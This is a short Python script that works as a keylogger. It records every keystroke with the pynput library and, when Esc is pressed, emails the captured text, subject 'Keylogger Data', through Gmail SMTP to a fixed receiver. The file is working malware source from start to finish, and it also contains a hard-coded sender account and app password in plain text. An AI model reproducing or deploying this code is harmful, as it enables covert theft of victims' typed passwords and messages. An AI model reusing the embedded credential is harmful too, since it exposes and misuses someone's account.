from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

text = ""

def on_key_down(key):
  global text
  try:
    text += key.char
  except AttributeError:
    if key == keyboard.Key.space: text += " "
    elif key == keyboard.Key.enter: text += "\n"
    elif key == keyboard.Key.tab: text += "\t"
    else: text += f" {str(key).split('.')[-1]} "
  

def on_key_up(key):
  global text
  if key == keyboard.Key.esc:
    send_mail()
    return False
  
def send_mail():
  global text

  sender = "mithibaiculturaldevelopers@gmail.com"
  receiver = "gauravmehramcc@gmail.com"
  password = "tgwwqugfdeshxejx"

  body = text
  message = MIMEMultipart()
  message["From"] = sender
  message["To"] = receiver
  message["Subject"] = "Keylogger Data"
  message.attach(MIMEText(body, "plain"))

  print("Sending mail")
  with smtplib.SMTP("smtp.gmail.com", 587) as s:
    s.starttls()
    s.login(sender, password)
    s.sendmail(sender, [receiver], message.as_string())
  print("Email sent")

with keyboard.Listener(on_press=on_key_down, on_release=on_key_up) as listener: listener.join()